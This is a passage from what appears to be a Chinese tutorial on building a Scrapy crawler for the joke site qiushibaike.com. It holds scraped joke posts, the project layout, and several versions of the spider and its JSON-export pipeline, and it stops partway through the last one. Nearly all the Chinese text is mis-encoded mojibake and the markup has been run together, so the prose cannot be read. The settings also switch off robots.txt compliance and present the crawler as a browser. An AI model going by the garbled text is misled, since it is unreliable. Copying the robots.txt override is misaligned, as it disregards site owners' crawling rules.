&quot;\n\n\nå°èˆ…å­å››å²çš„å¥³å„¿åœ¨æˆ‘å®¶åƒæ™šé¥­ï¼Œåšç‰¹æ„åšäº†å¥¹å–œæ¬¢åƒçš„è™¾å’Œç‰›è‚‰ï¼Œå¥¹å¾ˆæ‡‚äº‹ï¼Œä¸€ä¸ªåŠ²çš„è¯´è°¢è°¢å§‘çˆ¸çˆ¸ï¼ˆå§‘çˆ¶çš„æ„æ€ï¼‰â€¦â€¦èˆ…å­æ¥æ¥å¥¹çš„æ—¶é—´ï¼Œæˆ‘è¯´å–œæ¬¢åƒå§‘çˆ¸çˆ¸åšçš„èœï¼Œå°±ä½å§‘çˆ¸çˆ¸å®¶é‡Œå¥½ä¸ï¼Ÿä¸å¥½ä¸å¥½ï¼Œå§‘çˆ¸çˆ¸åˆšç»™å§‘å§‘è¯´,è¯´æˆ‘åˆåƒäº†ä»–ä»¬ä¸€ä¸ªæ˜ŸæœŸçš„ç”Ÿæ´»è´¹ï¼Œè¦å§‘å§‘æ—©ç‚¹æŠŠæˆ‘é€å›å»ï¼Œç°åœ¨è¯´è¦æˆ‘ä½ï¼Œéª—äººâ€¦â€¦æˆ‘å»ï¼Œè¿™è®©æˆ‘æ€ä¹ˆæ¥ï¼Ÿï¼Ÿ\n\n&quot;}{&quot;author&quot;: &quot;é›·éœ†ä¸‡é’§ï½&quot;, &quot;content&quot;: &quot;\n\n\nåœ¨ä¸ˆæ¯å¨˜å®¶åƒé¥­ï¼Œä¸ˆæ¯å¨˜è·Ÿè€ä¸ˆäººèµŒæ°”æ²¡åƒé¥­ï¼Œåƒè¿‡é¥­è·Ÿè€ä¸ˆäººä¸‹æ£‹ï¼Œè€ä¸ˆäººæ˜æ˜¾å¿ƒä¸åœ¨ç„‰ï¼Œçœ‹äº†çœ‹åœ¨é¤æ¡Œæ—è¾¹è½¬æ‚ çš„ä¸ˆæ¯å¨˜ï¼Œæ”¾ä¸‹æ£‹å­å°±å»äº†å•æ‰€ï¼Œå›æ¥æ²¡ä¸‹ä¸€ä¼šï¼Œåˆå»äº†å•æ‰€ã€‚æˆ‘è·Ÿä¸ˆæ¯å¨˜è¯´ï¼šçˆ¸æ˜¯ä¸æ˜¯è‚šå­ä¸èˆ’æœï¼Ÿè¦ä¸è¦æˆ‘å»ç»™ä»–ä¹°ç‚¹è¯ï¼Ÿä¸ˆæ¯å¨˜ç™½äº†æˆ‘ä¸€çœ¼ï¼šä½ çˆ¸çŸ¥é“æˆ‘é¦‹é‚£çŒªè¹„äº†ï¼Œåˆä¸å¥½æ„æ€åƒï¼Œå°±ç‰¹æ„å»å•æ‰€ï¼Œè®©æˆ‘å·åƒï¼Œè°çŸ¥é“ä½ è¿™å‚»å°å­å‚»æ¥åœ¨è¿™ä¸èµ°äº†ï¼\n\n&quot;}{&quot;author&quot;: &quot;ä¼ è¯´ä¸­çš„è°¢æ¼‚äº®&quot;, &quot;content&quot;: &quot;\n\n\nä»Šå¤©å‰‘å¤§å“¥å‘è¡¨äº†ä¸€åŠ¨æ€ã€‚ã€‚ä¸ˆæ¯å¨˜ï¼Œæ˜¯æ—¶å€™å‘è´§å•¦ï¼è¦ä¸ç„¶åªç»™ä¸€æ˜Ÿè¯„ä»·äº†ã€‚ã€‚ã€‚\n\n&quot;}{&quot;author&quot;: &quot;è€å·«å©†ï½ï½&quot;, &quot;content&quot;: &quot;\n\n\nè¡¨å¼Ÿå»ç›¸äº²ï¼Œç¬¬ä¸€æ¬¡å¥³æ–¹é—®è¡¨å¼Ÿâ€œè°ˆè¿‡æ‹çˆ±å—ï¼Ÿâ€è¡¨å¼Ÿè¯´ï¼šæ²¡è°ˆè¿‡ï¼å¥³æ–¹å«Œå¼ƒåœ°èµ°äº†ï¼Œè¯´æ˜¯æ²¡æœ‰æ‹çˆ±ç»éªŒçš„ä¸è¦ï¼ç¬¬äºŒæ¬¡å¥³æ–¹é—®è¡¨å¼Ÿâ€œè°ˆè¿‡æ‹çˆ±å—ï¼Ÿâ€è¿™æ¬¡è¡¨å¼Ÿå­¦ä¹–äº†è¯´ï¼šâ€œæœ‰ï¼Œè°ˆäº†å¥½å‡ æ¬¡æ‹çˆ±äº†ï¼â€å¥³æ–¹åˆå«Œå¼ƒåœ°èµ°äº†ï¼Œè¯´è¡¨å¼Ÿæ˜¯èŠ±å¿ƒå¤§èåœâ€¦ç¬¬ä¸‰æ¬¡è¡¨å¼Ÿå˜è¢«åŠ¨ä¸ºä¸»åŠ¨ï¼ŒæŠ¢å…ˆé—®å¯¹æ–¹æœ‰æ²¡æœ‰è°ˆè¿‡æ‹çˆ±ã€‚ç»“æœå¥³æ–¹å«Œå¼ƒä»–è¯´è¯å¤ªç›´ç™½ä¸å¤Ÿå§”å©‰ï¼Œä¹Ÿâ€¦ä¹Ÿèµ°äº†â€¦\n\n&quot;}{&quot;author&quot;: &quot;æ¸£æ¸£å©‰å„¿&quot;, &quot;content&quot;: &quot;\n\n\nç”·æœ‹å‹è¯´æˆ‘å¸äº†å¦†èƒ½è¿‡ä¸‡åœ£èŠ‚ï¼Œæˆ‘ç¬‘äº†ï¼Œä½ è„±äº†è£¤å­èƒ½è¿‡å„¿ç«¥èŠ‚ï½\n\n&quot;}{&quot;author&quot;: &quot;èƒ–é¦™&quot;, &quot;content&quot;: &quot;\n\n\nå¥³å„¿è€ƒè¯•è¢«è€å¸ˆè¡¨æ‰¬ï¼Œå›å®¶æˆ‘å¾ˆé«˜å…´çš„è·Ÿå¥¹è¯´:â€œä½ æƒ³è¦ä»€ä¹ˆå¥–åŠ±ï¼Ÿâ€å¥¹å…´å¥‹çš„è¯´:â€œä¸Šæ¬¡å¤§å§¨ç»™å°å¼Ÿå¼Ÿå‰ƒäº†å…‰å¤´ï¼Œé‚£ä¸ªè„‘è¢‹æ‘¸ç€å¥½èˆ’æœï¼Œä½ èƒ½å‰ƒå…‰ç»™æˆ‘æ‘¸å—ï¼Ÿï¼â€\n\n&quot;}{&quot;author&quot;: &quot;918ç–¯ç‹‚è‹±å­&quot;, &quot;content&quot;: &quot;\n\n\nå§å§ç»“å©šçš„æ—¶å€™æˆ‘éƒ½æ²¡ç©ºå›å»ï¼Œéƒ½ä¸çŸ¥å§å¤«å¼ å•¥æ ·ï¼Œä»Šå¹´å›å®¶é¡ºé“å»å§å§å®¶ç©ï¼Œæ‰“ä¸ªçš„ï¼Œå¸ˆå‚…çŒ¥ççš„çœ¼ç¥è¯´å¾ˆè¿œçš„æŸæŸå°åŒºå…«åï¼å»åˆ°å§å§å®¶æˆ‘æ‰çŸ¥é“è¢«å‘äº†ï¼Œåƒé¥­çš„æ—¶å€™å§å¤«å›æ¥äº†ï¼Œä½ èƒ½æƒ³è±¡æˆ‘çœ‹åˆ°å§å¤«å°±æ˜¯é‚£ä¸ªå‡ºç§Ÿè½¦å¸ˆå‚…æ—¶çš„è¡¨æƒ…å—ï¼Ÿå½“æ™šä»–å°±è¢«å§å§èµ¶å‡ºæˆ¿é—´ç¡å¤§å…\n\n&quot;}{&quot;author&quot;: &quot;æ‰¾å¥³å‹çš„å•èº«çŒª&quot;, &quot;content&quot;: &quot;\n\n\nä¸€æ—¦ä½ ä»¬å…¬å¸è£…ä¸Šäº†æ‰“å¡æœºï¼Œå°±æ„å‘³ç€ä½ ä»¬çš„å…¬å¸ä¸è¡Œäº†ï¼Œä½ ä»¬çš„è€æ¿æ€æƒ³è¿‚è…ï¼Œç»ˆç©¶æ˜¯ä¸ªç©·é€¼å…¬å¸ï¼Œæ—©èµ°æ—©å‘è´¢ã€‚\n\n&quot;}{&quot;author&quot;: &quot;é†‰é…’èˆå‰‘ç ç–¯å­.&quot;, &quot;content&quot;: &quot;\n\n\næ˜¨å¤©ï¼Œå¸¦ç€æˆ‘å®¶äºŒå“ˆå»é’“é±¼ï¼Œæˆ‘é™é™çš„ååœ¨æ²³è¾¹ï¼Œå‚»ç‹—åœ¨æ²³æ²¿ä¸Šåˆ°å¤„æ’’æ¬¢è·‘ï¼çªç„¶æœ‰é±¼ä¸Šé’©ï¼Œæˆ‘å¿«é€Ÿèµ·ç«¿æ”¶çº¿ï¼Œä¸€çœ‹ï¼Œå“‡ï½ï¼ä¸€æ¡äºŒæ–¤å¤šçš„é²¤é±¼ï¼Œæˆ‘æŠŠé±¼æ”¾è¿›æ°´æ¡¶é‡Œï¼Œå…´å¥‹çš„å–ŠäºŒå“ˆæ¥çœ‹æˆ‘çš„æ”¶è·ï¼äºŒå“ˆå¬è§æˆ‘å–Šå®ƒï¼Œå‘¼å‘¼çš„æœæˆ‘å¥”æ¥ï¼ç»“æœè¿™å‚»ç‹—æ²¡åˆ¹ä½ï¼ŒæŠŠæˆ‘çš„æ°´æ¡¶æ’ç¿»äº†ï¼Œæ­£å¥½æ»šåˆ°æ²³é‡Œï¼\n\n&quot;}{&quot;author&quot;: &quot;å¥”è·‘çš„å°åœŸç‹¼&quot;, &quot;content&quot;: &quot;\n\n\nå…¬å¸æˆç«‹å…«å‘¨å¹´ï¼è€æ¿è¯·åƒé¥­ï¼Œè·Ÿä»–åä¸€æ¡Œçš„é™¤äº†ç§˜ä¹¦ï¼Œå…¨æ˜¯é”€å”®éƒ¨é‚£äº›ç²¾è‹±å°ä¼™å­ä»¬ï¼Œå‰¯æ€»ã€ç»ç†éƒ½å¾—é è¾¹ç«™å°å‘¨åœ¨æˆ‘çº¿ä¸Šå¹²æ´»å„¿ï¼Œè¿™å°å­ä¸€ç‚¹å„¿æ‹¼åŠ²å„¿éƒ½æ²¡æœ‰æˆ‘å¯¹ä»–è¯´ï¼šä½ è¦èƒ½ååˆ°é‚£ä¸ªæ¡Œä¸Šå»ï¼Œåœ¨å’±ä»¬å‚å°±ç®—ä¸ªäººç‰©äº†å°å‘¨ï¼šå’±è€æ¿ä¸è¦ç”·ç§˜ä¹¦å§\n\n&quot;}{&quot;author&quot;: &quot;æ— ä¹¦æ–‹ä¸»&quot;, &quot;content&quot;: &quot;\n\n\næ˜¨å¤©å•ä½å°åˆ˜æ¥åŠå…¬å®¤ç»™æˆ‘è¯´:æ­£å”ï¼Œä½ å¸®æˆ‘ä¸ªå¿™ï¼Œæˆ‘ä»Šå¤©ç›¸äº²ï¼Œå¯¹æ–¹ä¼šå¸¦çˆ¸å¦ˆæ¥ï¼Œä½ å°±å½“æˆ‘ä¸¤ä¸ªå°æ—¶çš„çˆ¸çˆ¸å¥½ä¸å¥½ï¼Ÿæ‹œæ‰˜äº†â€¦â€¦æˆ‘æƒ³æƒ³ç­”åº”äº†â€¦â€¦åˆ°äº†å°åˆ˜çº¦å®šçš„åœ°æ–¹ï¼Œå¯¹é¢ä¸€ä¸ªäºŒåå¤šçš„å°å“¥çœ‹ç€æˆ‘é—®å°åˆ˜:è¿™å°±æ˜¯ä½ å–œæ¬¢çš„è€é¬¼ï¼Ÿè¿é¢å°±æ˜¯ä¸€æ‹³â€¦â€¦ä¸æ˜¯æˆ‘æœ‰ç‚¹åŠŸå¤«åº•å­ï¼Œä¼°è®¡ä¼šè¢«æ‰“æ­»ï¼ï¼\n\n&quot;}{&quot;author&quot;: &quot;çˆ±æ–°è§‰ç½—.é»„ç“œ&quot;, &quot;content&quot;: &quot;\n\n\næ¯æ¬¡æƒ¹è€å©†ç”Ÿæ°”ï¼Œå¥¹éƒ½ä¼šå»å¨æˆ¿æ‹é¸¡è›‹æ’’æ°”ï¼Œå®Œäº‹åå°†é¸¡è›‹æ®‹ æ¸£æ”¶é›†èµ·æ¥ï¼Œåšä¸€ç¢—é¸¡è›‹ç¾¹ï¼Œäº²æ‰‹å–‚ç»™æˆ‘åƒï¼å¥¹å–‚æˆ‘é¸¡è›‹ç¾¹æ—¶ï¼Œå˜´é‡Œè¿˜æŒ¯æŒ¯æœ‰è¯:â€œä½ ä¸ªå¤§åè›‹ï¼æˆ‘æ‹æ­»ä½ ï¼Œçƒ«æ­»ä½ ï¼Œå’¸æ­»ä½ ï¼â€åœ¨äº²æœ‹å¥½å‹çœ¼ä¸­è¿™æ˜¯ç§€æ©çˆ±ï¼Œè€Œåœ¨æˆ‘å¿ƒé‡Œï¼Œè¿™åªä¸è¿‡åˆæ˜¯ä¸€æ¬¡æ¶ä½œå‰§å¼çš„æƒ© ç½šï¼\n\n&quot;}{&quot;author&quot;: &quot;=æ­£åœ¨ä¸­æœ€&quot;, &quot;content&quot;: &quot;\n\n\næœ‰ä¸€å›ï¼Œæœ‰ä¸ªäººæ¬ æï¼Œäºæ˜¯ï¼Œæˆ‘æƒ³æ‰“ä»–å¯æ‰“ä¸åˆ°ï¼Œä»–åˆšæƒ³å¾€å‰ä¼¸å¤´ç»“æœæˆ‘æƒ³åšä¸ªæ ·å­ï¼Œå•ªçš„ä¸€å£°ï¼Œç‰™éƒ½æ‰äº†\n\n&quot;}{&quot;author&quot;: &quot;è€å·«å©†ï½ï½&quot;, &quot;content&quot;: &quot;\n\n\nåŒ»ç”Ÿä»ç—…æˆ¿å‡ºæ¥åï¼Œæˆ‘èµ¶ç´§å†²ä¸Šå»ï¼ŒæŠ“èµ·åŒ»ç”Ÿçš„æ‰‹æ€¥åˆ‡çš„é—®åˆ°:â€œåŒ»ç”Ÿï¼Œä»–æ€ä¹ˆæ ·ï¼Ÿä»–ä¼šä¸ä¼šæ­»å•Šï¼Ÿâ€åŒ»ç”Ÿä¸æ€¥ä¸ç¼“çš„è¯´:â€œç—…äººç›®å‰æ²¡ä»€ä¹ˆå¤§ç¢ï¼Œåªæ˜¯ä½ ä¸‹æ‰‹é‡äº†ç‚¹ï¼ŒæŠŠä»–æ‰“æ™•äº†ï¼â€æˆ‘æ·±æ·±çš„èˆ’äº†å£æ°”ï¼Œå‰ç”·å‹çº¦æˆ‘ä»Šæ™šè§é¢ï¼Œç”¨æ“€é¢æ–æŠŠä»–æ‰“æ™•äº†æˆ‘ä¹Ÿæ˜¯ é€¼ ä¸ å¾—å·²~\n\n&quot;}{&quot;author&quot;: &quot;æ¯’ç”·Â·i&quot;, &quot;content&quot;: &quot;\n\n\nåª³å¦‡å’Œå¤§å§¨å­æ˜¯åŒèƒèƒï¼Œåª³å¦‡åœ¨å®¶ä¸€è¾¹æŠ±ç€å‡ºç”Ÿä¸ä¹…çš„å°å¤–ç”¥ï¼Œä¸€è¾¹å½“æˆ‘é¢åŸ‹æ€¨å¥¹åŒèƒèƒå§å§ï¼šâ€œåˆ«äººéƒ½è¯´åŒèƒèƒå¥½ï¼Œæˆ‘å°±ä¸è¿™æ ·è®¤ä¸ºï¼â€æˆ‘è¡¥å……è¯´ï¼šâ€œåŒèƒèƒå¤šå¥½å•Šï¼ä»å°å°±ä¸å­¤å•ï¼Œå¯ä»¥äº’ç›¸æ›¿ä¸Šç­ï¼Œæ›¿ä¸Šå­¦ï¼Œå¤šè®©äººç¾¡æ…•å•Šï¼â€åª³å¦‡æŠŠå°å¤–ç”¥æ”¾åœ¨æ—è¾¹ï¼šâ€œå¯¹ï¼ä¹Ÿå°±æˆ‘é‚£äºŒè´§å§å§èƒ½æƒ³å‡ºæ¥ï¼Œå¥¹å»åº¦å‡ï¼Œè®©æˆ‘åœ¨å®¶éª—ä»–å­©å­å½“ä»–å¦ˆå¦ˆï¼â€\n\n&quot;}{&quot;author&quot;: &quot;æŒ–é¼»å­”çš„è€è™&quot;, &quot;content&quot;: &quot;\n\n\nåŠå¤œå›å®¶ç»è¿‡ä¸€æ¡å··å­ï¼Œçœ‹åˆ°ä¸€åªå…”å­è¹²åœ¨å¢™è§’ï¼Œå¿ä¸ä½å»æ‘¸ä¸€æ‘¸å®ƒã€‚æˆ‘åˆ°ç°åœ¨éƒ½ç‰¹ä¹ˆæƒ³ä¸æ˜ç™½ï¼Œç©¶ç«Ÿä»€ä¹ˆæ ·çš„äººä¼šç»™æµæµªç‹—æˆ´ä¸Šå…”è€³æœµï¼Ÿ\n\n&quot;}{&quot;author&quot;: &quot;æ¨é’±ä¸æˆå±±&quot;, &quot;content&quot;: &quot;\n\n\nè·Ÿæœ‹å‹å»æŸå››å„¿å­åº—çœ‹è½¦ï¼Œæœ‹å‹è·Ÿåº—å‘˜ç ä»·ï¼Œåº—å‘˜è¯´è¯´åšä¸äº†ä¸»ï¼Œè¦è·Ÿç»ç†è¯·ç¤ºä¸€ä¸‹ï¼äºæ˜¯ä»–ç”¨æ‰‹æœºæ‹¨é€šäº†ç»ç†çš„ç”µè¯ï¼Œå°±åœ¨åº—å‘˜è·Ÿç»ç†çƒ­ç«æœå¤©å•†é‡ä»·æ ¼çš„æ—¶å€™ï¼Œçªç„¶ï½åº—å‘˜çš„æ‰‹æœºå“èµ·äº†éŸ³ä¹\n\n&quot;}{&quot;author&quot;: &quot;å¤©å±±æ— æƒ…å‰‘&quot;, &quot;content&quot;: &quot;\n\n\nå¥¹å¦ˆçš„ï¼Œç³—ç™¾é‡Œè¿™ä¸ªç³–ç³–æ€ä¹ˆå¤©å¤©éƒ½åœ¨ï¼Œä½ æ˜¯å“ªä¸ªé¬¼\n\n&quot;}</code></pre><h1 id="æ–°å»ºScrapyé¡¹ç›®"><a href="#æ–°å»ºScrapyé¡¹ç›®" class="headerlink" title="æ–°å»ºScrapyé¡¹ç›®"></a>æ–°å»ºScrapyé¡¹ç›®</h1><pre><code>scrapy startproject é¡¹ç›®åç§°scrapy startproject QiuShiBaiKe</code></pre><h2 id="é¡¹ç›®ç›®å½•è§£æ"><a href="#é¡¹ç›®ç›®å½•è§£æ" class="headerlink" title="é¡¹ç›®ç›®å½•è§£æ"></a>é¡¹ç›®ç›®å½•è§£æ</h2><pre><code>L:.â”‚  scrapy.cfgâ”‚  start.pyâ”‚  Test.pyâ”‚  Test2.pyâ”‚â””â”€QiuShiBaiKe        # é¡¹ç›®æ–‡ä»¶å¤¹    â”‚  items.py        # ç”¨æ¥å­˜æ”¾çˆ¬è™«çˆ¬å–ä¸‹æ¥æ•°æ®çš„æ¨¡å‹    â”‚  middlewares.py    # ä¸­é—´ä»¶æ–‡ä»¶    â”‚  pipelines.py        # ç”¨æ¥å°†Itemsçš„æ¨¡å‹å­˜å‚¨åˆ°æœ¬åœ°ç£ç›˜ä¸­    â”‚  QiuShiBaiKe.json    â”‚  settings.py        # æœ¬çˆ¬è™«çš„ä¸€äº›é…ç½®ä¿¡æ¯(è¯·æ±‚å¤´,ipä»£ç†æ± ç­‰é…ç½®)    â”‚  __init__.py    â”‚    â”œâ”€spiders    â”‚  â”‚  QiuShi.py        # çˆ¬è™«æ–‡ä»¶,è¿è¡Œscrapy genspider å‘½ä»¤è‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶    â”‚  â”‚  __init__.py</code></pre><h2 id="åˆ›å»ºä¸€ä¸ªçˆ¬è™«"><a href="#åˆ›å»ºä¸€ä¸ªçˆ¬è™«" class="headerlink" title="åˆ›å»ºä¸€ä¸ªçˆ¬è™«"></a>åˆ›å»ºä¸€ä¸ªçˆ¬è™«</h2><pre><code>scrapy genspider QiuShi &quot;qiushibaike.com&quot;</code></pre><h2 id="è¿è¡ŒScrapy-ä½¿ç”¨Pythonè„šæœ¬è¿è¡ŒScrapyé¡¹ç›®"><a href="#è¿è¡ŒScrapy-ä½¿ç”¨Pythonè„šæœ¬è¿è¡ŒScrapyé¡¹ç›®" class="headerlink" title="è¿è¡ŒScrapy(ä½¿ç”¨Pythonè„šæœ¬è¿è¡ŒScrapyé¡¹ç›®)"></a>è¿è¡ŒScrapy(ä½¿ç”¨Pythonè„šæœ¬è¿è¡ŒScrapyé¡¹ç›®)</h2><p>è¿è¡ŒScrapyé¡¹ç›®,éœ€è¦åœ¨ç»ˆç«¯ä¸‹è¿›å…¥é¡¹ç›®çš„æ ¹ç›®å½•,ç„¶åæ‰§è¡ŒScrapy crawl [çˆ¬è™«åå­—],å¦‚æœä¸æƒ³æ¯æ¬¡éƒ½åœ¨ç»ˆç«¯è¿è¡Œå¯ä»¥æŠŠè¿™ä¸ªå‘½ä»¤å†™åœ¨ä¸€ä¸ªPythonè„šæœ¬æ–‡ä»¶ä¸­,ç„¶åå†Pycharmä¸­è¿è¡Œè„šæœ¬å³å¯.</p><p>æ–°å»ºä¸€ä¸ªStart.pyçš„æ–‡ä»¶,ç„¶åå†™å…¥ä»¥ä¸‹ä»£ç .</p><pre><code>from scrapy import cmdlinecmdline.execute(&quot;scrapy crawl QiuShi&quot;.split())</code></pre><p>scrapy crawl <strong>QiuShi(è¿™é‡Œæ˜¯çˆ¬è™«åå­—,è€Œä¸æ˜¯Scrapyé¡¹ç›®çš„åå­—)</strong></p><h1 id="ç‰ˆæœ¬ä¸€-å®Œæˆç®€å•çš„çˆ¬å–å¹¶å°†æ•°æ®ä¿å­˜æˆJSONæ ¼å¼"><a href="#ç‰ˆæœ¬ä¸€-å®Œæˆç®€å•çš„çˆ¬å–å¹¶å°†æ•°æ®ä¿å­˜æˆJSONæ ¼å¼" class="headerlink" title="ç‰ˆæœ¬ä¸€:å®Œæˆç®€å•çš„çˆ¬å–å¹¶å°†æ•°æ®ä¿å­˜æˆJSONæ ¼å¼"></a>ç‰ˆæœ¬ä¸€:å®Œæˆç®€å•çš„çˆ¬å–å¹¶å°†æ•°æ®ä¿å­˜æˆJSONæ ¼å¼</h1><p>QiuShi.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom QiuShiBaiKe.items import QiushibaikeItemfrom scrapy.http.response.html import HtmlResponseclass QiushiSpider(scrapy.Spider):    name = &#39;QiuShi&#39;    allowed_domains = [&#39;qiushibaike.com&#39;]  # çˆ¬è™«åŸŸé™åˆ¶åŸŸ    start_urls = [&#39;https://www.qiushibaike.com/text/page/1/&#39;]  # å¼€å§‹çš„URL    def parse(self, response):        outerbox = response.xpath(&quot;//div[@id=&#39;content-left&#39;]/div&quot;)  # ä½¿ç”¨Scrapyå†…ç½®çš„xpathè¿›è¡Œå…ƒç´ æ€’çš„é€‰æ‹©        for box in outerbox:            # æå–ä½œè€…å’Œå†…å®¹            author = box.xpath(&quot;.//h2/text()&quot;).extract_first().strip()            content = box.xpath(&quot;.//div[@class=&#39;content&#39;]/span/text()&quot;).getall()            content = &#39;&#39;.join(content)            items = QiushibaikeItem(author=author, content=content)            yield items  # ç”Ÿæˆå™¨,åªè¦ä¸€ä¸ªå‡½æ•°ä¸­æœ‰yieldé‚£ä¹ˆä»–å°±ä¸æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°äº†,è€Œæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨.</code></pre><p>items.py</p><pre><code># -*- coding: utf-8 -*-# Define here the models for your scraped items## See documentation in:# https://doc.scrapy.org/en/latest/topics/items.html# Itemå®šä¹‰æ•°æ®æ¨¡å‹import scrapyclass QiushibaikeItem(scrapy.Item):    author = scrapy.Field()    content = scrapy.Field()</code></pre><p>middlewares.py</p><p>åˆå§‹æ–‡ä»¶å¹¶æœªæ”¹åŠ¨</p><p>piplines.py</p><pre><code># -*- coding: utf-8 -*-# Define your item pipelines here## Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html# Piplinesç”¨æ¥å°†Itemçš„æ•°æ®æ¨¡å‹å­˜å‚¨åˆ°ç¡¬ç›˜ä¸­import jsonclass QiushibaikePipeline(object):    &#39;&#39;&#39;å°†itemçš„æ•°æ®æ¨¡å‹å­˜å‚¨åˆ°JSONæ–‡ä»¶ä¸­&#39;&#39;&#39;    def __init__(self):        # åˆ›å»ºæ–‡ä»¶å¯¹è±¡        self.fileproject = open(&#39;QiuShiBaiKe.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)  # æ‰“å¼€æ–‡ä»¶    def open_spider(self, spider):        print(&#39;*&#39; * 50)        print(&#39;Piplineså¼€å§‹ä¿å­˜æ•°æ®&#39;)        print(&#39;*&#39; * 50)    def process_item(self, item, spider):        &#39;&#39;&#39;å¤„ç†item,å†™å…¥æ–‡ä»¶&#39;&#39;&#39;        item_json = json.dumps(dict(item),ensure_ascii=False)         # å°†itemä¼ è¿‡æ¥çš„æ•°æ®,è½¬æ¢æˆJSON,ensure_asciiä¸ºFalseæ‰èƒ½è½¬æ¢æˆä¸­æ–‡        self.fileproject.write(item_json + &quot;\n&quot;)        return item    def close_spider(self, spider):        &#39;&#39;&#39;å…³é—­çˆ¬è™«&#39;&#39;&#39;        self.fileproject.close()        print(&#39;*&#39; * 50)        print(&#39;Piplinesç»“æŸä¿å­˜æ•°æ®&#39;)        print(&#39;*&#39; * 50)</code></pre><p>settings.py</p><pre><code>BOT_NAME = &#39;QiuShiBaiKe&#39;SPIDER_MODULES = [&#39;QiuShiBaiKe.spiders&#39;]NEWSPIDER_MODULE = &#39;QiuShiBaiKe.spiders&#39;# æ˜¯å¦éµå®ˆçˆ¬è™«åè®®,æ”¹ä¸ºFalseROBOTSTXT_OBEY = False        # æ·»åŠ è¯·æ±‚å¤´DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&#39;,}# å¼€å¯ITEM_PIPELINES# åé¢çš„Valueæ˜¯æŒ‡ä¼˜å…ˆçº§ITEM_PIPELINES = {    &#39;QiuShiBaiKe.pipelines.QiushibaikePipeline&#39;: 300,}</code></pre><h1 id="ç‰ˆæœ¬-äºŒ-ä¼˜åŒ–æ•°æ®å­˜å‚¨æ–¹å¼-ä¸€-ä½¿ç”¨JsonItemExporterå­˜å‚¨æ•°æ®"><a href="#ç‰ˆæœ¬-äºŒ-ä¼˜åŒ–æ•°æ®å­˜å‚¨æ–¹å¼-ä¸€-ä½¿ç”¨JsonItemExporterå­˜å‚¨æ•°æ®" class="headerlink" title="ç‰ˆæœ¬(äºŒ)ä¼˜åŒ–æ•°æ®å­˜å‚¨æ–¹å¼(ä¸€)ä½¿ç”¨JsonItemExporterå­˜å‚¨æ•°æ®"></a>ç‰ˆæœ¬(äºŒ)ä¼˜åŒ–æ•°æ®å­˜å‚¨æ–¹å¼(ä¸€)ä½¿ç”¨JsonItemExporterå­˜å‚¨æ•°æ®</h1><p>å…¶ä»–æ–‡ä»¶ä¸å˜,piplinesæ–‡ä»¶ä¿®æ”¹å¦‚ä¸‹</p><p>piplines.py</p><pre><code>from scrapy.exporters import JsonItemExporter       # Scrapyå†…ç½®çš„JSONå¯¼å‡ºæ¨¡å—class QiushibaikePipeline(object):    &#39;&#39;&#39;å°†itemçš„æ•°æ®æ¨¡å‹å­˜å‚¨åˆ°JSONæ–‡ä»¶ä¸­&#39;&#39;&#39;    def __init__(self):        # åˆ›å»ºæ–‡ä»¶å¯¹è±¡        self.fileproject = open(&#39;QiuShiBaiKe.json&#39;, &#39;wb&#39;)  # ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶        self.exportar = JsonItemExporter(self.fileproject,ensure_ascii=False,encoding=&#39;utf-8&#39;)        self.exportar.start_exporting()     # å¼€å§‹å¯¼å‡º    def open_spider(self, spider):        print(&#39;*&#39; * 50)        print(&#39;Piplineså¼€å§‹ä¿å­˜æ•°æ®&#39;)        print(&#39;*&#39; * 50)    def process_item(self, item, spider):        &#39;&#39;&#39;å¤„ç†item,å†™å…¥æ–‡ä»¶&#39;&#39;&#39;        self.exportar.export_item(item)        return item    def close_spider(self, spider):        &#39;&#39;&#39;å…³é—­çˆ¬è™«&#39;&#39;&#39;        self.exportar.finish_exporting()        # å®Œæˆå¯¼å…¥        self.fileproject.close()        print(&#39;*&#39; * 50)        print(&#39;Piplinesç»“æŸä¿å­˜æ•°æ®&#39;)        print(&#39;*&#39; * 50)</code></pre><p>è¿™ç§å­˜å‚¨jsonæ–‡ä»¶çš„æ–¹å¼æœ‰ä¸ªå¼Šç«¯,å°±æ˜¯<strong>å®ƒä¼šå°†æ‰€æœ‰çš„JSONæ•°æ®éƒ½ä¿å­˜åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­,éå¸¸æ¶ˆè€—å†…å­˜,é€‚åˆæ•°æ®é‡æ¯”è¾ƒå°çš„é¡¹ç›®</strong></p><h1 id="ç‰ˆæœ¬-ä¸‰-ä¼˜åŒ–æ•°æ®å­˜å‚¨çš„æ–¹å¼-äºŒ-ä½¿ç”¨JsonLinesItemExporterå­˜å‚¨æ•°æ®"><a href="#ç‰ˆæœ¬-ä¸‰-ä¼˜åŒ–æ•°æ®å­˜å‚¨çš„æ–¹å¼-äºŒ-ä½¿ç”¨JsonLinesItemExporterå­˜å‚¨æ•°æ®" class="headerlink" title="ç‰ˆæœ¬(ä¸‰)ä¼˜åŒ–æ•°æ®å­˜å‚¨çš„æ–¹å¼(äºŒ)ä½¿ç”¨JsonLinesItemExporterå­˜å‚¨æ•°æ®"></a>ç‰ˆæœ¬(ä¸‰)ä¼˜åŒ–æ•°æ®å­˜å‚¨çš„æ–¹å¼(äºŒ)ä½¿ç”¨JsonLinesItemExporterå­˜å‚¨æ•°æ®</h1><p>ä¿®æ”¹piplines,å…¶ä»–ä»£ç ä¸å˜</p><pre><code># -*- coding: utf-8 -*-# Piplinesç”¨æ¥å°†Itemçš„æ•°æ®æ¨¡å‹å­˜å‚¨åˆ°ç¡¬ç›˜ä¸­from scrapy.exporters import JsonLinesItemExporter  # Scrapyå†…ç½®çš„JSONå¯¼å‡ºæ¨¡å—class QiushibaikePipeline(object):    &#39;&#39;&#39;å°†itemçš„æ•°æ®æ¨¡å‹å­˜å‚¨åˆ°JSONæ–‡ä»¶ä¸­&#39;&#39;&#39;    def __init__(self):        # 